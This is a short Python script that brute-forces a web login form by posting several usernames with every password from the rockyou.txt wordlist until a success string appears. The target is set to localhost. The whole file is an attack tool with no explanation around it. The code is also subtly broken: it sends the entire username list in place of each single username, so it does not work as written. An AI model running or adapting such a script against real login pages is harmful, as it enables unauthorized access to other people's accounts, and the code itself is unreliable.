import requests
import sys

target = "http://127.0.0.1"
usernames = ["admin","user","test"]
passwords = "rockyou.txt"
needle = "welcome back"

for user in usernames:
    with open(passwords, "r") as passwords_list:
        for password in passwords_list:
            password = password.strip("\n").encode()
            sys.stdout.write("[X] Attempting user:passowrd -> {}:{}\r".format(usernames, password.decode()))
            sys.stdout.flush()
            r = requests.post(target, data={"username": usernames, "password": password})
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write("\t [>>>>] Valid Password '{}' found for user '{}'!".format(password.decode(), usernames))
                sys.exit()
    sys.stdout.flush()
    sys.stdout.write("\n")
    sys.stdout.write("\tNo Password Found for '{}'!".format(usernames))